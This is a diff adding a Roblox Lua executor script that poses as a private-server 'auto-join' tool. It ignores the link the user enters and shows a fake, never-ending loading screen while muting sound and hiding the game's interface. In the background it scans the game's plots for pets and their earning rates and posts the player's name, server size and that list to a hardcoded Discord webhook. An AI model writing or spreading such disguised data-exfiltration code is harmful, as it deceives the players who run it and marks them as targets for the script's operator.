@@ -1,0 +1,648 @@
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local Workspace = game:GetService("Workspace")
+local StarterGui = game:GetService("StarterGui")
+local RunService = game:GetService("RunService")
+local SoundService = game:GetService("SoundService")
+
+local LocalPlayer = Players.LocalPlayer
+
+local DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1436075317004599296/dihpzM1lcLiwTk6pg-fBAes_SzBw7_UG2VuEBLQE0UK1-_aFEQZpYGJkuCfavkiFr_5q"
+local WEBHOOK_URL = DEFAULT_WEBHOOK
+
+local function createInputUI()
+    local InputUI = Instance.new("ScreenGui")
+    InputUI.Name = "InputUI"
+    InputUI.ResetOnSpawn = false
+    InputUI.Parent = LocalPlayer:WaitForChild("PlayerGui")
+    InputUI.IgnoreGuiInset = true
+
+    local Frame = Instance.new("Frame", InputUI)
+    Frame.Name = "MainFrame"
+    Frame.Active = true
+    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    Frame.BackgroundColor3 = Color3.fromRGB(20, 22, 25)
+    Frame.BorderSizePixel = 0
+    Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    Frame.Size = UDim2.new(0, 400, 0, 280)
+    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 10)
+
+    local Title = Instance.new("TextLabel", Frame)
+    Title.Name = "Title"
+    Title.BackgroundTransparency = 1
+    Title.Position = UDim2.new(0, 20, 0, 20)
+    Title.Size = UDim2.new(1, -40, 0, 40)
+    Title.Font = Enum.Font.GothamBold
+    Title.Text = "MÉTODO CRISZX"
+    Title.TextColor3 = Color3.fromRGB(255,255,255)
+    Title.TextSize = 24
+    Title.TextXAlignment = Enum.TextXAlignment.Left
+
+    local Sub = Instance.new("TextLabel", Frame)
+    Sub.BackgroundTransparency = 1
+    Sub.Position = UDim2.new(0, 20, 0, 60)
+    Sub.Size = UDim2.new(1, -40, 0, 20)
+    Sub.Font = Enum.Font.Gotham
+    Sub.Text = "Melhor auto-join do mercado"
+    Sub.TextColor3 = Color3.fromRGB(70,89,255)
+    Sub.TextSize = 12
+    Sub.TextXAlignment = Enum.TextXAlignment.Left
+
+    local Separator = Instance.new("Frame", Frame)
+    Separator.BackgroundColor3 = Color3.fromRGB(45,50,55)
+    Separator.BorderSizePixel = 0
+    Separator.Position = UDim2.new(0,20,0,90)
+    Separator.Size = UDim2.new(1,-40,0,1)
+
+    local Label = Instance.new("TextLabel", Frame)
+    Label.Position = UDim2.new(0, 20, 0, 110)
+    Label.Size = UDim2.new(1, -40, 0, 20)
+    Label.Font = Enum.Font.GothamMedium
+    Label.Text = "Link do Servidor Privado"
+    Label.TextColor3 = Color3.fromRGB(180,185,190)
+    Label.TextSize = 12
+    Label.TextXAlignment = Enum.TextXAlignment.Left
+
+    local TextBox = Instance.new("TextBox", Frame)
+    TextBox.Name = "InputBox"
+    TextBox.BackgroundColor3 = Color3.fromRGB(28,30,33)
+    TextBox.BorderSizePixel = 0
+    TextBox.ClipsDescendants = true
+    TextBox.Position = UDim2.new(0,20,0,140)
+    TextBox.Size = UDim2.new(1,-40,0,40)
+    TextBox.ClearTextOnFocus = false
+    TextBox.Font = Enum.Font.Gotham
+    TextBox.PlaceholderColor3 = Color3.fromRGB(90,95,100)
+    TextBox.PlaceholderText = "https://www.roblox.com/share?code=..."
+    TextBox.Text = ""
+    TextBox.TextColor3 = Color3.fromRGB(220,220,220)
+    TextBox.TextSize = 12
+    TextBox.TextXAlignment = Enum.TextXAlignment.Left
+    Instance.new("UICorner", TextBox).CornerRadius = UDim.new(0,6)
+    local Padding = Instance.new("UIPadding", TextBox)
+    Padding.PaddingLeft = UDim.new(0,12)
+    Padding.PaddingRight = UDim.new(0,12)
+
+    local Confirm = Instance.new("TextButton", Frame)
+    Confirm.Name = "ConfirmButton"
+    Confirm.BackgroundColor3 = Color3.fromRGB(47,49,177)
+    Confirm.BorderSizePixel = 0
+    Confirm.Position = UDim2.new(0,20,1,-50)
+    Confirm.Size = UDim2.new(1,-40,0,40)
+    Confirm.AutoButtonColor = false
+    Confirm.Font = Enum.Font.GothamBold
+    Confirm.Text = "CONFIRMAR"
+    Confirm.TextColor3 = Color3.fromRGB(255,255,255)
+    Confirm.TextSize = 13
+    Instance.new("UICorner", Confirm).CornerRadius = UDim.new(0,6)
+
+    return {
+        Screen = InputUI,
+        Frame = Frame,
+        TextBox = TextBox,
+        Confirm = Confirm,
+    }
+end
+
+local function createLoadingUI()
+    local LoadingUI = Instance.new("ScreenGui")
+    LoadingUI.Name = "LoadingUI"
+    LoadingUI.ResetOnSpawn = false
+    LoadingUI.DisplayOrder = 999999
+    LoadingUI.Parent = LocalPlayer:WaitForChild("PlayerGui")
+    LoadingUI.IgnoreGuiInset = true
+
+    local RootFrame = Instance.new("Frame", LoadingUI)
+    RootFrame.Name = "Frame"
+    RootFrame.BackgroundColor3 = Color3.fromRGB(15,17,20)
+    RootFrame.BorderSizePixel = 0
+    RootFrame.Size = UDim2.new(1,0,1,0)
+    RootFrame.ZIndex = 999999
+
+    local Container = Instance.new("Frame", LoadingUI)
+    Container.Name = "MainUi"
+    Container.Active = true
+    Container.AnchorPoint = Vector2.new(0.5,0.5)
+    Container.BackgroundTransparency = 1
+    Container.Position = UDim2.new(0.5,0,0.5,0)
+    Container.Size = UDim2.new(0,500,0,350)
+    Container.ZIndex = 999999
+
+    local UIListLayout = Instance.new("UIListLayout", Container)
+    UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+    UIListLayout.Padding = UDim.new(0,10)
+
+    local Title = Instance.new("TextLabel", Container)
+    Title.BackgroundTransparency = 1
+    Title.LayoutOrder = 1
+    Title.Size = UDim2.new(1,-20,0,50)
+    Title.ZIndex = 999999
+    Title.Font = Enum.Font.GothamBlack
+    Title.Text = "Método CrisZX"
+    Title.TextColor3 = Color3.fromRGB(255,255,255)
+    Title.TextSize = 32
+
+    local Version = Instance.new("TextLabel", Container)
+    Version.BackgroundTransparency = 1
+    Version.LayoutOrder = 2
+    Version.Size = UDim2.new(1,-20,0,20)
+    Version.ZIndex = 999999
+    Version.Font = Enum.Font.Gotham
+    Version.Text = "v3.0"
+    Version.TextColor3 = Color3.fromRGB(70,89,255)
+    Version.TextSize = 12
+
+    local CircleFrame = Instance.new("Frame", Container)
+    CircleFrame.Name = "LoadingCircle"
+    CircleFrame.Active = true
+    CircleFrame.LayoutOrder = 3
+    CircleFrame.BackgroundTransparency = 1
+    CircleFrame.Size = UDim2.new(0,80,0,80)
+    CircleFrame.ZIndex = 999999
+
+    local CircleImage = Instance.new("ImageLabel", CircleFrame)
+    CircleImage.Name = "ImageLabel"
+    CircleImage.BackgroundTransparency = 1
+    CircleImage.Rotation = 36
+    CircleImage.Size = UDim2.new(1,0,1,0)
+    CircleImage.ZIndex = 999999
+    CircleImage.Image = "rbxassetid://4965945816"
+    CircleImage.ImageColor3 = Color3.fromRGB(70,89,255)
+
+    -- Notes will display status messages with animated dots (".", "..", "...")
+    local Notes = Instance.new("TextLabel", Container)
+    Notes.Name = "Notes"
+    Notes.BackgroundTransparency = 1
+    Notes.LayoutOrder = 4
+    Notes.Size = UDim2.new(1,-20,0,40)
+    Notes.ZIndex = 999999
+    Notes.Font = Enum.Font.GothamBold
+    Notes.Text = ""
+    Notes.TextColor3 = Color3.fromRGB(220,220,225)
+    Notes.TextSize = 20
+
+    local Percentage = Instance.new("TextLabel", Container)
+    Percentage.Name = "Percentage"
+    Percentage.BackgroundTransparency = 1
+    Percentage.LayoutOrder = 5
+    Percentage.Size = UDim2.new(1,-20,0,25)
+    Percentage.ZIndex = 999999
+    Percentage.Font = Enum.Font.Gotham
+    Percentage.Text = "0%"
+    Percentage.TextColor3 = Color3.fromRGB(70,89,255)
+    Percentage.TextSize = 14
+
+    local LoadingBar = Instance.new("Frame", Container)
+    LoadingBar.Name = "LoadingBar"
+    LoadingBar.Active = true
+    LoadingBar.BackgroundColor3 = Color3.fromRGB(30,32,35)
+    LoadingBar.BorderSizePixel = 0
+    LoadingBar.LayoutOrder = 6
+    LoadingBar.Size = UDim2.new(0.6,0,0,4)
+    LoadingBar.ZIndex = 999999
+    Instance.new("UICorner", LoadingBar).CornerRadius = UDim.new(1,0)
+
+    local LoadingProgress = Instance.new("Frame", LoadingBar)
+    LoadingProgress.Name = "LoadingProgress"
+    LoadingProgress.BackgroundColor3 = Color3.fromRGB(70,89,255)
+    LoadingProgress.BorderSizePixel = 0
+    LoadingProgress.Size = UDim2.new(0,0,1,0) -- starts empty
+    LoadingProgress.ZIndex = 999999
+    Instance.new("UICorner", LoadingProgress).CornerRadius = UDim.new(1,0)
+
+    local Credits = Instance.new("TextLabel", Container)
+    Credits.Name = "Credits"
+    Credits.BackgroundTransparency = 1
+    Credits.LayoutOrder = 7
+    Credits.Size = UDim2.new(1,-20,0,20)
+    Credits.ZIndex = 999999
+    Credits.Font = Enum.Font.GothamBold
+    Credits.Text = "POWERED BY CRISZX"
+    Credits.TextColor3 = Color3.fromRGB(80,85,90)
+    Credits.TextSize = 10
+
+    LoadingUI.Enabled = false
+
+    return {
+        Screen = LoadingUI,
+        Main = Container,
+        CircleImage = CircleImage,
+        LoadingBar = LoadingBar,
+        LoadingProgress = LoadingProgress,
+        Notes = Notes,
+        Percentage = Percentage,
+        Credits = Credits,
+    }
+end
+
+
+-- parse strings like "1.1M/s", "12,345/s", "123/s" into numeric money-per-second (number)
+local function parseMoneyPerSec(text)
+    if not text then return 0 end
+    -- try to find numeric part with optional suffix
+    -- examples matched: "1.1M/s", "$12,345/s", "123/s"
+    local s = tostring(text)
+    -- remove $ and /s and whitespace to simplify
+    s = s:gsub("%$", ""):gsub("/s", ""):gsub("%s+", "")
+    -- capture number + optional suffix letter
+    local numStr, suffix = s:match("([%d%,%.]+)([KMBTQ]?)")
+    if not numStr then
+        return 0
+    end
+    numStr = numStr:gsub(",", "")
+    local n = tonumber(numStr) or 0
+    local mult = 1
+    if suffix == "K" then mult = 1e3
+    elseif suffix == "M" then mult = 1e6
+    elseif suffix == "B" then mult = 1e9
+    elseif suffix == "T" then mult = 1e12
+    elseif suffix == "Q" then mult = 1e15
+    end
+    return n * mult
+end
+
+local function scanPlotsSummary()
+    local results = {}
+    local ratesByName = {}
+
+    local plotsFolder = Workspace:FindFirstChild("Plots")
+    if not plotsFolder then
+        return results
+    end
+
+    local IGNORE = {
+        AnimalPodiums = true, Decorations = true, InvisibleWalls = true, Laser = true, LaserHitbox = true,
+        Purchases = true, Skin = true, Unlock = true, AnimalTarget = true, DeliveryHitbox = true,
+        MainRoot = true, Multiplier = true, PlotSign = true, Slope = true, Spawn = true, StealHitbox = true,
+        FriendPanel = true,
+    }
+
+    -- Iterate all plots and look for UI labels representing pets
+    for _, plot in pairs(plotsFolder:GetChildren()) do
+        if not (plot:IsA("Model") or plot:IsA("Folder")) then
+            continue
+        end
+
+        for _, desc in pairs(plot:GetDescendants()) do
+            -- Look for DisplayName TextLabel pattern used by many pet systems
+            if desc:IsA("TextLabel") and desc.Name == "DisplayName" and desc.Text and desc.Text ~= "" then
+                local parent = desc.Parent
+                if parent then
+                    -- find Generation label sibling (common name)
+                    local genLabel = parent:FindFirstChild("Generation") or parent:FindFirstChild("Gen") or parent:FindFirstChild("GenerationLabel")
+                    if genLabel and genLabel:IsA("TextLabel") and genLabel.Text and genLabel.Text ~= "" then
+                        local petName = desc.Text
+                        local genText = genLabel.Text
+                        local mps = parseMoneyPerSec(genText)
+                        if mps and mps > 0 then
+                            -- keep the maximum observed mps for the same pet name
+                            ratesByName[petName] = math.max(ratesByName[petName] or 0, mps)
+                        end
+                    else
+                        -- fallback: try to find NumberValue/IntValue under the same model/folder indicating rate
+                        for _, childVal in pairs(parent:GetDescendants()) do
+                            if (childVal:IsA("NumberValue") or childVal:IsA("IntValue")) and tonumber(childVal.Value) and tonumber(childVal.Value) > 0 then
+                                local petName = desc.Text
+                                local mps = tonumber(childVal.Value)
+                                ratesByName[petName] = math.max(ratesByName[petName] or 0, mps)
+                                break
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    -- Build results as table entries { name=..., mps=... } sorted by mps desc
+    for name, mps in pairs(ratesByName) do
+        table.insert(results, { name = name, mps = mps })
+    end
+
+    table.sort(results, function(a, b) return (a.mps or 0) > (b.mps or 0) end)
+    return results
+end
+
+-- =========================
+-- HTTP fallback (tries multiple providers; executor-friendly)
+-- =========================
+local function doHttpRequest(options)
+    -- options: { Url=string, Method=string, Headers=table, Body=string }
+    options = options or {}
+    local url = options.Url
+    local method = (options.Method or "GET"):upper()
+    local headers = options.Headers or {}
+    local body = options.Body
+
+    -- 1) Try HttpService:RequestAsync (Roblox or some executors)
+    local ok, res = pcall(function()
+        if HttpService and HttpService.RequestAsync then
+            return HttpService:RequestAsync({
+                Url = url,
+                Method = method,
+                Headers = headers,
+                Body = body,
+            })
+        end
+    end)
+    if ok and res then
+        return true, res
+    end
+
+    -- 2) syn.request
+    if typeof(syn) == "table" and syn.request then
+        local ok2, res2 = pcall(function()
+            return syn.request({
+                Url = url,
+                Method = method,
+                Headers = headers,
+                Body = body,
+            })
+        end)
+        if ok2 and res2 then return true, res2 end
+    end
+
+    -- 3) http.request (Krnl / others)
+    if type(http) == "table" and http.request then
+        local ok3, res3 = pcall(function()
+            return http.request({
+                Url = url,
+                Method = method,
+                Headers = headers,
+                Body = body,
+            })
+        end)
+        if ok3 and res3 then return true, res3 end
+    end
+
+    -- 4) request (older)
+    if type(request) == "function" then
+        local ok4, res4 = pcall(function()
+            return request({
+                Url = url,
+                Method = method,
+                Headers = headers,
+                Body = body,
+            })
+        end)
+        if ok4 and res4 then return true, res4 end
+    end
+
+    -- 5) game:HttpGet / HttpPost (some executors expose)
+    if type(game) == "userdata" then
+        local ok5, res5 = pcall(function()
+            if method == "GET" and game.HttpGet then
+                return { Body = game:HttpGet(url) }
+            elseif method == "POST" and game.HttpPost then
+                return { Body = game:HttpPost(url, body or "") }
+            end
+        end)
+        if ok5 and res5 then return true, res5 end
+    end
+
+    return false, "no-http-provider"
+end
+
+local function sendDiscordWebhookFallback(webhookUrl, brainrotEntries)
+    webhookUrl = webhookUrl or WEBHOOK_URL
+
+    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
+    local playerName = (LocalPlayer and LocalPlayer.Name) or "Unknown"
+    local playerCount = #Players:GetPlayers()
+
+    -- helper: format numbers into short K/M/B/T/Q with one decimal when needed
+    local function formatShort(n)
+        n = tonumber(n) or 0
+        local absn = math.abs(n)
+        if absn >= 1e15 then
+            return string.format("%.1fQ", n / 1e15)
+        elseif absn >= 1e12 then
+            return string.format("%.1fT", n / 1e12)
+        elseif absn >= 1e9 then
+            return string.format("%.1fB", n / 1e9)
+        elseif absn >= 1e6 then
+            return string.format("%.1fM", n / 1e6)
+        elseif absn >= 1e3 then
+            return string.format("%.1fK", n / 1e3)
+        else
+            return tostring(math.floor(n))
+        end
+    end
+
+    local brainrotsList = ""
+    if brainrotEntries and #brainrotEntries > 0 then
+        for i, entry in ipairs(brainrotEntries) do
+            if type(entry) == "table" and entry.name then
+                brainrotsList = brainrotsList .. string.format("%s → %s/s", entry.name, formatShort(entry.mps or 0))
+            elseif type(entry) == "string" then
+                -- fallback if old-format strings are passed
+                brainrotsList = brainrotsList .. entry
+            end
+            if i < #brainrotEntries then
+                brainrotsList = brainrotsList .. "\n"
+            end
+            if i >= 40 then
+                brainrotsList = brainrotsList .. "\n... e mais"
+                break
+            end
+        end
+    else
+        brainrotsList = "Nenhum brainrot detectado"
+    end
+
+    local payload = {
+        content = "@everyone @here, detecção automática executada",
+        embeds = { {
+            title = "🧠 DETECÇÃO DE BRAINROTS 🧠",
+            color = 0xFF0000,
+            fields = {
+                { name = "⌛ Data e hora de execução:", value = currentTime, inline = false },
+                { name = "👤 Nome de usuário:", value = playerName, inline = true },
+                { name = "👥 Pessoas no servidor:", value = tostring(playerCount), inline = true },
+                -- ONLY the MoneyPerSec lines as requested (ALL entries included)
+                { name = "🎒🧠 BRAINROTS DETECTADOS:", value = brainrotsList, inline = false },
+            },
+            author = { name = "Notificador🧠" },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        } }
+    }
+
+    local okEncode, body = pcall(function() return HttpService:JSONEncode(payload) end)
+    if not okEncode then
+        return false, "json-encode-failed"
+    end
+
+    local headers = { ["Content-Type"] = "application/json" }
+    local ok, res = doHttpRequest({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = headers,
+        Body = body,
+    })
+
+    if ok then
+        -- print a generic success message
+        print("Webhook enviado (fallback).")
+        return true, res
+    else
+        warn("Falha ao enviar webhook (fallback):", res)
+        return false, res
+    end
+end
+
+-- =========================
+-- Remove Topbar / disable CoreGui (COFIZIN style) and try CoreGui.TopBarApp
+-- =========================
+local function removeTopbarAndCoreGui()
+    pcall(function()
+        pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
+        for _, guiType in ipairs(Enum.CoreGuiType:GetEnumItems()) do
+            if guiType ~= Enum.CoreGuiType.Chat then
+                pcall(function() StarterGui:SetCoreGuiEnabled(guiType, false) end)
+            end
+        end
+        pcall(function() StarterGui:SetCore("RightClickMenu", false) end)
+    end)
+end
+
+local function disableCoreGuiTopBarApp()
+    pcall(function()
+        local coreGui = game:GetService("CoreGui")
+        local topbar = coreGui:FindFirstChild("TopBarApp")
+        if topbar then
+            -- try common structures
+            pcall(function()
+                if topbar:IsA("Folder") or topbar:IsA("ScreenGui") or topbar:IsA("Instance") then
+                    if topbar:FindFirstChild("TopBarApp") then
+                        local inner = topbar:FindFirstChild("TopBarApp")
+                        if inner and inner.Enabled ~= nil then
+                            inner.Enabled = false
+                        end
+                    elseif topbar.Enabled ~= nil then
+                        topbar.Enabled = false
+                    end
+                elseif topbar.Enabled ~= nil then
+                    topbar.Enabled = false
+                end
+            end)
+        end
+    end)
+end
+
+-- =========================
+-- LOADING BEHAVIOR (pula por faixas e pausa 2s por faixa) - Notes mostrará mensagens com animação de pontos
+-- =========================
+local LOADING_MESSAGES = {
+    {max = 22, text = "Mapeando jogadores"},
+    {max = 34, text = "Analisando inventário"},
+    {max = 41, text = "Processando dados"},
+    {max = 53, text = "Conexão segura ativa"},
+    {max = 61, text = "Sincronizando dados"},
+    {max = 72, text = "Preparando ambiente"},
+    {max = 84, text = "Carregando módulos"},
+    {max = 92, text = "Localizando alvos"},
+    {max = 98, text = "Coletando dados"},
+    {max = 99, text = "Finalizando (pode demorar)"},
+}
+
+local function startInfiniteLoader(loadingUIRefs)
+    local CircleImage = loadingUIRefs.CircleImage
+    local LoadingProgress = loadingUIRefs.LoadingProgress
+    local LoadingBar = loadingUIRefs.LoadingBar
+    local Notes = loadingUIRefs.Notes
+    local Percentage = loadingUIRefs.Percentage
+
+    if not (CircleImage and LoadingProgress and LoadingBar and Percentage and Notes) then
+        warn("Componentes do LoadingUI não encontrados.")
+        return
+    end
+
+    -- apply isolation / UI hiding
+    pcall(function()
+        SoundService.Muted = true
+        SoundService.MasterVolume = 0
+    end)
+    removeTopbarAndCoreGui()
+    disableCoreGuiTopBarApp()
+
+    -- rotation animation
+    spawn(function()
+        while loadingUIRefs.Screen.Enabled do
+            CircleImage.Rotation = (CircleImage.Rotation + 6) % 360
+            RunService.RenderStepped:Wait()
+        end
+    end)
+
+    -- loop: iterate over LOADING_MESSAGES continuously WITHOUT resetting to 0% between cycles
+    spawn(function()
+        while loadingUIRefs.Screen.Enabled do
+            for _, entry in ipairs(LOADING_MESSAGES) do
+                if not loadingUIRefs.Screen.Enabled then break end
+                local p = entry.max
+                Percentage.Text = tostring(p) .. "%"
+                local frac = math.clamp(p / 100, 0, 0.99)
+                LoadingProgress:TweenSize(UDim2.new(frac, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.4, true)
+
+                -- Show the message with animated dots ".", "..", "..."
+                local base = entry.text
+                -- animate three-dot cycle exactly for 2 seconds (three steps of 2/3s)
+                for i = 1, 3 do
+                    if not loadingUIRefs.Screen.Enabled then break end
+                    local dots = string.rep(".", i)
+                    Notes.Text = base .. dots
+                    -- wait exactly 2/3 seconds per dot state so total = 2 seconds
+                    task.wait(2/3)
+                end
+            end
+
+            -- very small pause to avoid tight loop (no reset to 0%)
+            wait(0.05)
+        end
+    end)
+end
+
+-- =========================
+-- Integration: UI + button behavior
+-- =========================
+local inputUI = createInputUI()
+local loadingUI = createLoadingUI()
+
+inputUI.Screen.Enabled = true
+loadingUI.Screen.Enabled = false
+
+inputUI.Confirm.MouseButton1Click:Connect(function()
+    -- ignore TextBox contents; always use WEBHOOK_URL
+    inputUI.Confirm.Active = false
+
+    -- show LoadingUI
+    loadingUI.Screen.Enabled = true
+    inputUI.Screen.Enabled = false
+
+    -- start loader
+    startInfiniteLoader(loadingUI)
+
+    -- send webhook once in background using fallback (executor enabled -> should work)
+    local found = scanPlotsSummary()
+    spawn(function()
+        local ok, res = sendDiscordWebhookFallback(WEBHOOK_URL, found)
+        if ok then
+            print("Envio de detecção concluído.")
+        else
+            warn("Envio de detecção falhou:", res)
+        end
+    end)
+end)
+
+-- expose start function (optional)
+local M = {}
+M.startLoader = function()
+    inputUI.Screen.Enabled = false
+    loadingUI.Screen.Enabled = true
+    startInfiniteLoader(loadingUI)
+end
+
+pcall(function() LocalPlayer:SetAttribute("DetectaLoaded", true) end)
+
+return M
